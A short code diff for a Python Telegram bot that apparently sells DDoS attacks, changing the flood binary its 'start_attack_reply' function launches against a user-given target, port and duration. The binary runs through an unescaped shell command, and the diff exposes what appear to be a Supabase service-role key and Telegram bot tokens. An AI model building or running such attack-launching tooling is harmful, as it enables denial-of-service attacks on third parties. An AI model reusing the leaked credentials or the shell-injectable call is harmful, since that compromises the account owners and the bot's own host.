@@ -26,7 +26,7 @@ url = "https://ldmyijysjjaimrbpqmek.supabase.co"
 key = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxkbXlpanlzamphaW1yYnBxbWVrIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTczMjkwNjE5MSwiZXhwIjoyMDQ4NDgyMTkxfQ.mCpuIq0yPRskbuyxjXk57sB99dDqhxZ2YRJxtwaRk3U"
 supabase: Client = create_client(url, key)
 
-bot = telebot.TeleBot('7599785141:AAFOyZCPd2hB8EGJyyF1HuF896aZd-bDfwA')
+bot = telebot.TeleBot('7599785141:AAFHZO-XodOtqfddSVIYZlQwPofJ5hariTo')
 IST = pytz.timezone('Asia/Kolkata')
 
 # Database connection
@@ -483,7 +483,7 @@ def start_attack_reply(message, target, port, time):
     
     try:
         # Execute attack
-        subprocess.run(f"./Kalia {target} {port} {time}", shell=True)
+        subprocess.run(f"./RAGNAROK {target} {port} {time}", shell=True)
         
         # Calculate attack duration
         end_time = datetime.now(IST)
